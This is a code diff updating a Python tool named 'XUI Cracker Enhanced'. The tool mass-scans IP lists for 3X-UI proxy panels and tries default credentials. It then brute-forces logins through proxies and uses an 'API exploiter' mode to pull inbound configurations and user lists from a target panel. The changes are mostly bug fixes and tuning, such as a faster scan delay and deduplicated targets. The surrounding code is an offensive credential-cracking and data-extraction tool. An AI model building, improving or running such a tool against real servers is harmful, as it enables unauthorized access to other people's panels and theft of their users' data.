+                        print(f"{Colors.CYAN}    Version: {result.version}{Colors.END}")
                 else:
                     self.stats.increment('bad')
                     
@@ -1067,7 +1270,8 @@ class XUICrackerApp:
             self.credentials.extend(default_found)
             
             # Get remaining targets
-            remaining = [t for t in valid_targets if t.url not in [c.target_url for c in default_found]]
+            found_urls = {c.target_url for c in default_found}
+            remaining = [t for t in valid_targets if t.full_url not in found_urls]
             
             # Phase 3: Brute force
             if remaining and usernames and passwords:
@@ -1086,7 +1290,7 @@ class XUICrackerApp:
         save_results(self.credentials)
         
     def run_scanner_mode(self):
-        """Run scanner mode only"""
+        """Run scanner mode only - enhanced"""
         DisplayManager.print_banner()
         
         ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}IP list file (IP:PORT): {Colors.END}").strip() or "ips.txt"
@@ -1110,10 +1314,12 @@ class XUICrackerApp:
                 if result.version:
                     print(f"{Colors.CYAN}    Version: {result.version}{Colors.END}")
                 if result.vulnerabilities:
-                    print(f"{Colors.YELLOW}    Vulnerabilities: {', '.join(result.vulnerabilities)}{Colors.END}")
+                    vulns = [v for v in result.vulnerabilities if not v.startswith('potential_')]
+                    if vulns:
+                        print(f"{Colors.YELLOW}    Vulnerabilities: {', '.join(vulns)}{Colors.END}")
                     
             self.stats.increment('targets_scanned')
-            time.sleep(0.1)
+            time.sleep(0.05)
             
         print(f"\n\n{Colors.GREEN}[+] Scan complete!{Colors.END}")
         print(f"{Colors.CYAN}[*] Total scanned: {len(targets)}{Colors.END}")
@@ -1130,7 +1336,8 @@ class XUICrackerApp:
                     'is_xui': r.is_xui,
                     'version': r.version,
                     'vulnerabilities': r.vulnerabilities,
-                    'endpoints': r.endpoints
+                    'endpoints': r.endpoints,
+                    'response_time': r.target.response_time
                 } for r in results
             ]
         }
@@ -1141,7 +1348,7 @@ class XUICrackerApp:
         print(f"{Colors.GREEN}[+] Results saved to xui_scan_results.json{Colors.END}")
         
     def run_api_exploit(self):
-        """Run API exploiter mode"""
+        """Run API exploiter mode - enhanced"""
         DisplayManager.print_banner()
         
         target_url = input(f"{Colors.CYAN}[?] {Colors.WHITE}Target XUI URL: {Colors.END}").strip()
@@ -1173,12 +1380,12 @@ class XUICrackerApp:
             
         if results['inbounds']:
             print(f"\n{Colors.GREEN}[+] Found {len(results['inbounds'])} inbound configurations:{Colors.END}")
-            for i, inbound in enumerate(results['inbounds'][:5], 1):  # Show first 5
+            for i, inbound in enumerate(results['inbounds'][:5], 1):
                 print(f"{Colors.CYAN}    {i}. Protocol: {inbound.get('protocol', 'unknown')}, Port: {inbound.get('port', 'unknown')}{Colors.END}")
                 
         if results['users']:
             print(f"\n{Colors.GREEN}[+] Found {len(results['users'])} users:{Colors.END}")
-            for user in results['users'][:5]:  # Show first 5
+            for user in results['users'][:5]:
                 print(f"{Colors.CYAN}    - {user.get('username', 'unknown')}{Colors.END}")
                 
         # Save results
@@ -1215,7 +1422,7 @@ class XUICrackerApp:
 
 # ==================== CLI INTERFACE ====================
 def main():
-    """CLI entry point"""
+    """CLI entry point - fixed COLORS typo"""
     parser = argparse.ArgumentParser(
         description=f'XUI Cracker Enhanced v{VERSION} - Advanced 3X-UI Panel Security Toolkit',
         formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -1255,7 +1462,6 @@ Examples:
     # Load proxies if provided
     if args.proxy_file:
         app.proxy_manager.load_from_file(args.proxy_file)
-        print(f"{Colors.GREEN}[+] Loaded proxies from {args.proxy_file}{Colors.END}")
     
     try:
         if args.mode == 'scan' or args.scan_only:
@@ -1296,7 +1502,8 @@ Examples:
             default_found = app.default_checker.check_targets(valid_targets, args.threads)
             app.credentials.extend(default_found)
             
-            remaining = [t for t in valid_targets if t.url not in [c.target_url for c in default_found]]
+            found_urls = {c.target_url for c in default_found}
+            remaining = [t for t in valid_targets if t.full_url not in found_urls]
             if remaining:
                 brute_found = app.engine.run_attack(remaining, usernames, passwords, args.threads)
                 app.credentials.extend(brute_found)
@@ -1305,7 +1512,8 @@ Examples:
             
         elif args.mode == 'api':
             if not args.target_url:
-                print(f"{COLORS.RED}[-] --target-url required for API mode{COLORS.END}")
+                # FIXED: Was COLORS.RED instead of Colors.RED
+                print(f"{Colors.RED}[-] --target-url required for API mode{Colors.END}")
                 return
             parsed = urlparse(args.target_url)
             target = Target(
@@ -1341,6 +1549,6 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Colors.RED}[!] Exited by user{Colors.END}")
+        print(f"\n{Colors.RED}![!] Exited by user{Colors.END}")
     except Exception as e:
-        print(f"{Colors.RED}[!] Fatal error: {e}{Colors.END}")
+        print(f"{Colors.RED}![!] Fatal error: {e}{Colors.END}")
